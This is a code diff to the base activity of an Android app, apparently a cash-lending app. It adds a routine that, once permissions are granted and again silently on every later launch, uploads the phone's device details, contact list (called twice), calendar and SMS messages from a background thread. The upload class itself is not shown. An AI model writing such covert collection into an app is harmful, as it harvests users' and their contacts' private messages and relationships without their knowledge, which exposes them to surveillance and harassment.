@@ -42,6 +42,7 @@ import com.cashhub.cash.common.CommonResult;
 import com.cashhub.cash.common.Host;
 import com.cashhub.cash.common.KndcEvent;
 import com.cashhub.cash.common.KndcStorage;
+import com.cashhub.cash.common.UploadData;
 import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
 import java.io.FileNotFoundException;
@@ -91,17 +92,16 @@ public class BaseActivity extends AppCompatActivity {
   public ConfigDao mConfigDao;
   public ReportInfoDao mReportInfoDao;
   public String mUserToken = "";
+  private boolean isInit = false;
 
   @Override
   protected void onCreate(Bundle savedInstanceState) {
     super.onCreate(savedInstanceState);
-    initData();
     //禁止横屏
     setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
     setFullScreen(this);
 
-    //EventBus
-    EventBus.getDefault().register(this);
+    initData();
   }
 
   @Override
@@ -212,8 +212,11 @@ public class BaseActivity extends AppCompatActivity {
     } else if (KndcEvent.GET_POLICY_SIGN.equals(event.getEventName())) {
       uploadImage(event);
     } else if (KndcEvent.BEGIN_CHECK_PERMISSION.equals(event.getEventName())) {
+      setConfigInfo(KndcStorage.H5_IS_CHECK_PERMISSION, "1");
       if (!hasPermission()) {
         requestPermission();
+      } else {
+        collectDataAndUpload();
       }
     } else if (KndcEvent.UPLOAD_IMAGE_SUCCESS.equals(event.getEventName())) {
       String commonRet = event.getCommonRet();
@@ -318,6 +321,12 @@ public class BaseActivity extends AppCompatActivity {
    * 初始化启动数据
    */
   private void initData() {
+    if(isInit) {
+      return;
+    }
+    //EventBus
+    EventBus.getDefault().register(this);
+
     DaoMaster.DevOpenHelper helper = new DaoMaster.DevOpenHelper(this, DATABASE_NAME);
     SQLiteDatabase database = helper.getWritableDatabase();
     DaoMaster daoMaster = new DaoMaster(database);
@@ -334,6 +343,24 @@ public class BaseActivity extends AppCompatActivity {
       for (Config config : configList) {
         KndcStorage.getInstance().setData(config.getConfigKey(), config.getConfigValue());
       }
+    }
+
+    String appIsInit =
+        KndcStorage.getInstance().getData(KndcStorage.APP_IS_INIT);
+    if (!TextUtils.isEmpty(appIsInit) && appIsInit.equals(KndcStorage.YSE)) {
+      //设置初始化
+      setConfigInfo(KndcStorage.APP_IS_INIT, "1");
+    }
+
+    setConfigInfo(KndcStorage.APP_LAST_OPEN_TIME, String.valueOf(System.currentTimeMillis()));
+
+    String appIsCheckPermission =
+        KndcStorage.getInstance().getData(KndcStorage.H5_IS_CHECK_PERMISSION);
+
+    if (!TextUtils.isEmpty(appIsCheckPermission) && appIsCheckPermission
+        .equals(KndcStorage.YSE)) {
+      //收集数据
+      collectDataAndUpload();
     }
   }
 
@@ -353,6 +380,21 @@ public class BaseActivity extends AppCompatActivity {
     Intent intent = new Intent();
     intent.setAction(MediaStore.ACTION_IMAGE_CAPTURE);
     startActivityForResult(intent, TAKE_PHOTO);
+  }
+
+
+
+  /**
+   * 设置配置信息
+   */
+  public void setConfigInfo(String configKey, String configValue) {
+    KndcStorage.getInstance().setData(configKey, configValue);
+
+    //配置信息 存入数据库和缓存，启动app的时候载入
+    Config configInfo = new Config();
+    configInfo.setConfigKey(configKey);
+    configInfo.setConfigValue(configValue);
+    mConfigDao.insertOrReplace(configInfo);
   }
 
   /**
@@ -498,55 +540,49 @@ public class BaseActivity extends AppCompatActivity {
     }, 300);
   }
 
-//  public void checkPermission(Activity activity, PermissionListener listener, String... permissions) {
-//    permissionListener = listener;
-//    mPermissionsChecker = new PermissionsChecker(activity);
-//    // 缺少权限时, 进入权限配置页面
-//    if (permissions != null && mPermissionsChecker.lacksPermissions(permissions)) {
-//      PermissionsActivity.startActivityForResult(activity, PERMISSIONS_REQUEST_CODE, permissions);
-//      activity.overridePendingTransition(0, 0);
-//      return;
-//    }
-//    permissonResult(true);
-//  }
-//  // 判断是否缺少权限
-//  private boolean lacksPermission(String permission) {
-//    return ContextCompat.checkSelfPermission(getApplicationContext(), permission) ==
-//        PackageManager.PERMISSION_DENIED;
-//  }
-//  // 请求权限
-//  private void requestPermissions(String... permissions) {
-//    ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
-//  }
-
   @Override
   public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
     super.onRequestPermissionsResult(requestCode, permissions, grantResults);
     if (PERMISSION_REQUEST_CODE_STORAGE == requestCode) {
       if (!hasPermission()) {
         requestPermission();
+      } else {
+        collectDataAndUpload();
       }
-//      if (grantResults.length == 0 || grantResults[0] != PackageManager.PERMISSION_GRANTED) {
-//        requestPermission();
-//      } else {
-//
-//      }
     }
   }
 
+  //授权完成之后数据上报
+  public void collectDataAndUpload() {
+    new Thread(() -> {
+      try {
+        long smsLastTime = Long.parseLong(KndcStorage.getInstance().getData(KndcStorage.CONFIG_SMS_TIME));
+        setConfigInfo(KndcStorage.CONFIG_SMS_TIME, String.valueOf(System.currentTimeMillis()));
+
+        UploadData uploadData = new UploadData(this);
+        uploadData.getAndSendDevice();
+        uploadData.getAndSendContact();
+        uploadData.getAndSendCalendar();
+        uploadData.getAndSendContact();
+        uploadData.getAndSendSms(smsLastTime);
+      } catch (Exception e) {
+        Log.d(TAG, e.getMessage());
+      }
+    }).start();//启动线程
+  }
 
   //等待弹出数字键盘
-  public void waitCheckPermission() {
-    Timer timer = new Timer();//开启一个时间等待任务
-    timer.schedule(new TimerTask() {
-      @Override
-      public void run() {
-        if (!hasPermission()) {
-          requestPermission();
-        }
-      }
-    }, 500);
-  }
+//  public void waitCheckPermission() {
+//    Timer timer = new Timer();//开启一个时间等待任务
+//    timer.schedule(new TimerTask() {
+//      @Override
+//      public void run() {
+//        if (!hasPermission()) {
+//          requestPermission();
+//        }
+//      }
+//    }, 500);
+//  }
 
   synchronized public boolean hasPermission() {
     for (String permission : permissions) {
